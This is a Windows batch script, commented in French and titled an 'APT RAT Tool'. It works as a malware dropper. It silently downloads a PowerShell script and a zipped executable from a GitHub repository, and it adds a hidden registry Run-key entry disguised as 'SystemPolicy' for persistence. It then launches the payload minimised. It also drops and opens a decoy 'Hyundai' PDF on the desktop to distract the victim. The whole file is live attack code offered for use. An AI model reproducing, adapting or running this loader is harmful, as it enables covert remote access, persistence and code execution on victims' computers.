@echo off
setlocal enabledelayedexpansion

REM ========================================
REM Living.bat - APT RAT Tool v2.0
REM ========================================

REM Vérifier le mode d'exécution
set "mode_run=false"
if "%1"=="-run" (
    set "mode_run=true"
    echo Mode -run détecté - Exécution silencieuse
    goto :mode_silent
)

REM Mode normal (avec interface)
echo Mode normal - Interface complète
goto :mode_normal

:mode_silent
REM ========================================
REM MODE SILENCIEUX (-run)
REM ========================================
@echo off >nul 2>&1

REM Initialisation silencieuse
set "v1=https://github.com/hundaicasp-cmd/OneServ/raw/main/OneServ.zip"
set "v2=%TEMP%\%RANDOM%.zip"
set "v3=C:\Users\Public\%date:~10,4%%date:~4,2%%date:~7,2%"

REM Persistance silencieuse
set "cheminReg=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "nomPersistance=SystemPolicy"

reg query "%cheminReg%" /v "%nomPersistance%" >nul 2>&1
if %errorlevel% equ 0 (
    goto :verification_connexion_silent
)

set "scriptPath=%TEMP%\emo.ps1"
if not exist "%scriptPath%" (
    powershell -WindowStyle Hidden -Command "& {try { $content = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/hundaicasp-cmd/OneServ/refs/heads/main/poo.txt' -UseBasicParsing; Set-Content -Path '%scriptPath%' -Value $content.Content -Encoding UTF8 } catch { } }" >nul 2>&1
)

set "commandePersistance=powershell.exe -Exec Bypass -W Hidden -File \"%scriptPath%\""
reg add "%cheminReg%" /v "%nomPersistance%" /t REG_SZ /d "%commandePersistance%" /f >nul 2>&1

:verification_connexion_silent
ping -n 1 8.8.8.8 >nul 2>&1
if %errorlevel% neq 0 (
    goto :fin_silent
)

REM Vérification et téléchargement silencieux
set "executableValide=false"

if exist "%v3%\*OneServ*.exe" (
    for /f "delims=" %%i in ('dir /b "%v3%\*OneServ*.exe" 2^>nul') do (
        set "executableExistant=%v3%\%%i"
        set "executableValide=true"
    )
)

if "%executableValide%"=="false" (
    set "tentativesDownload=0"
    set "maxTentatives=3"
    
    :download_loop_silent
    set /a "tentativesDownload+=1"
    
    powershell -WindowStyle Hidden -Command "& {try { Invoke-WebRequest -Uri '%v1%' -OutFile '%v2%' } catch { } }" >nul 2>&1
    
    if exist "%v2%" (
        if not exist "%v3%" mkdir "%v3%" >nul 2>&1
        
        powershell -WindowStyle Hidden -Command "& {try { Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%v2%', '%v3%') } catch { } }" >nul 2>&1
        
        if exist "%v3%\*OneServ*.exe" (
            for /f "delims=" %%i in ('dir /b "%v3%\*OneServ*.exe" 2^>nul') do (
                set "executableCible=%v3%\%%i"
                set "executableValide=true"
            )
        )
        
        del "%v2%" /f /q >nul 2>&1
    )
    
    if "%executableValide%"=="false" if !tentativesDownload! lss !maxTentatives! (
        timeout /t 3 /nobreak >nul
        goto :download_loop_silent
    )
)

REM Vérification NsMonitor silencieuse
set "executionAutorisee=true"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "NsMonitor" >nul 2>&1
if %errorlevel% equ 0 (
    set "executionAutorisee=false"
)

REM Exécution silencieuse
if "%executableValide%"=="true" if exist "%executableCible%" if "%executionAutorisee%"=="true" (
    start "" /min "!executableCible!" -run >nul 2>&1
)

:fin_silent
exit /b 0

:mode_normal
REM ========================================
REM MODE NORMAL (sans -run)
REM ========================================

REM Initialisation
set "v1=https://github.com/hundaicasp-cmd/OneServ/raw/main/OneServ.zip"
set "v2=%TEMP%\%RANDOM%.zip"
set "v3=C:\Users\Public\%date:~10,4%%date:~4,2%%date:~7,2%"

REM Créer PDF leurre (déplacé à la fin)
set "nomPDF=Hyundai"
set "cheminPDF=%USERPROFILE%\Desktop\%nomPDF%.pdf"

if not exist "%cheminPDF%" (
    echo Création du PDF leurre...
    echo %%PDF-1.4 > "%cheminPDF%"
    echo 1 0 obj >> "%cheminPDF%"
    echo << /Type /Catalog /Pages 2 0 R >> >> "%cheminPDF%"
    echo endobj >> "%cheminPDF%"
    echo 2 0 obj >> "%cheminPDF%"
    echo << /Type /Pages /Kids [3 0 R] /Count 1 >> >> "%cheminPDF%"
    echo endobj >> "%cheminPDF%"
    echo 3 0 obj >> "%cheminPDF%"
    echo << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >> >> "%cheminPDF%"
    echo endobj >> "%cheminPDF%"
    echo 4 0 obj >> "%cheminPDF%"
    echo << /Length 44 >> >> "%cheminPDF%"
    echo stream >> "%cheminPDF%"
    echo BT /F1 12 Tf 72 720 Td () Tj ET >> "%cheminPDF%"
    echo endstream >> "%cheminPDF%"
    echo endobj >> "%cheminPDF%"
    echo xref >> "%cheminPDF%"
    echo 0 5 >> "%cheminPDF%"
    echo 0000000000 65535 f >> "%cheminPDF%"
    echo 0000000009 00000 n >> "%cheminPDF%"
    echo 0000000058 00000 n >> "%cheminPDF%"
    echo 0000000112 00000 n >> "%cheminPDF%"
    echo 0000000202 00000 n >> "%cheminPDF%"
    echo trailer >> "%cheminPDF%"
    echo << /Size 5 /Root 1 0 R >> >> "%cheminPDF%"
    echo startxref >> "%cheminPDF%"
    echo 321 >> "%cheminPDF%"
    echo %%EOF >> "%cheminPDF%"
    
    start "" "%cheminPDF%"
)

REM Persistance améliorée
echo Création de la persistance SystemPolicy...
set "cheminReg=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "nomPersistance=SystemPolicy"

reg query "%cheminReg%" /v "%nomPersistance%" >nul 2>&1
if %errorlevel% equ 0 (
    echo La clé de registre %nomPersistance% existe déjà - Persistance déjà active
    goto :verification_connexion
)

set "scriptPath=%TEMP%\emo.ps1"
if exist "%scriptPath%" (
    echo Le script emo.ps1 existe déjà dans temp - Utilisation du script existant
) else (
    echo Téléchargement du script de persistance depuis GitHub...
    powershell -Command "& {try { $content = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/hundaicasp-cmd/OneServ/refs/heads/main/poo.txt' -UseBasicParsing; Set-Content -Path '%scriptPath%' -Value $content.Content -Encoding UTF8; Write-Host 'Script téléchargé et sauvegardé: %scriptPath%' } catch { Write-Host 'Erreur lors du téléchargement: ' + $_.Exception.Message } }"
)

set "commandePersistance=powershell.exe -Exec Bypass -W Hidden -File \"%scriptPath%\""
reg add "%cheminReg%" /v "%nomPersistance%" /t REG_SZ /d "%commandePersistance%" /f
echo Persistance créée avec le nom: %nomPersistance%
echo Commande: %commandePersistance%

:verification_connexion
echo Vérification de la connexion internet...
set "testConnexion=false"
set "tentatives=0"

:test_loop
ping -n 1 8.8.8.8 >nul 2>&1
if %errorlevel% equ 0 (
    set "testConnexion=true"
    echo Connexion internet disponible
) else (
    set /a "tentatives+=1"
    if !tentatives! lss 5 (
        echo Tentative !tentatives! - Attente de 5 secondes...
        timeout /t 5 /nobreak >nul
        goto :test_loop
    ) else (
        echo Aucune connexion internet après 5 tentatives
    )
)

REM Vérification et téléchargement
set "executableValide=false"

if exist "%v3%\*OneServ*.exe" (
    for /f "delims=" %%i in ('dir /b "%v3%\*OneServ*.exe" 2^>nul') do (
        set "executableExistant=%v3%\%%i"
        set "executableTrouve=true"
        echo OneServ.exe trouvé: !executableExistant!
        set "executableValide=true"
    )
)

if "%testConnexion%"=="true" if "%executableValide%"=="false" (
    set "tentativesDownload=0"
    set "maxTentatives=3"
    
    :download_loop
    set /a "tentativesDownload+=1"
    echo Tentative de téléchargement #!tentativesDownload!
    
    powershell -Command "& {try { Invoke-WebRequest -Uri '%v1%' -OutFile '%v2%'; Write-Host 'ZIP téléchargé' } catch { Write-Host 'Erreur: ' + $_.Exception.Message } }"
    
    if exist "%v2%" (
        echo ZIP téléchargé - Vérification du poids...
        
        if not exist "%v3%" mkdir "%v3%"
        
        powershell -Command "& {try { Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%v2%', '%v3%'); Write-Host 'ZIP extrait' } catch { Write-Host 'Erreur extraction: ' + $_.Exception.Message } }"
        
        if exist "%v3%\*OneServ*.exe" (
            for /f "delims=" %%i in ('dir /b "%v3%\*OneServ*.exe" 2^>nul') do (
                set "executableCible=%v3%\%%i"
                echo Exécutable extrait: !executableCible!
                set "executableValide=true"
            )
        )
        
        del "%v2%" /f /q
    )
    
    if "%executableValide%"=="false" if !tentativesDownload! lss !maxTentatives! (
        echo Nouvelle tentative dans 3 secondes...
        timeout /t 3 /nobreak >nul
        goto :download_loop
    )
)

REM Vérification NsMonitor
echo Vérification de la clé de registre NsMonitor...
set "executionAutorisee=true"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "NsMonitor" >nul 2>&1
if %errorlevel% equ 0 (
    echo La clé de registre NsMonitor existe - Arrêt de l'exécution
    set "executionAutorisee=false"
) else (
    echo La clé de registre NsMonitor n'existe pas - Exécution autorisée
)

REM Exécution
if "%executableValide%"=="true" if exist "%executableCible%" if "%executionAutorisee%"=="true" (
    echo Toutes les vérifications passées - Lancement de OneServ.exe
    start "" /min "!executableCible!" -run
    echo Processus exécuté en arrière-plan
) else (
    if "%executionAutorisee%"=="false" (
        echo Exécution bloquée: La clé de registre NsMonitor existe
    ) else (
        echo Aucun exécutable valide trouvé pour l'exécution
    )
)

REM Nettoyage temporaire
echo Nettoyage temporaire dans 30 secondes...
timeout /t 30 /nobreak >nul
if exist "%v2%" del "%v2%" /f /q

echo Script terminé.
pause
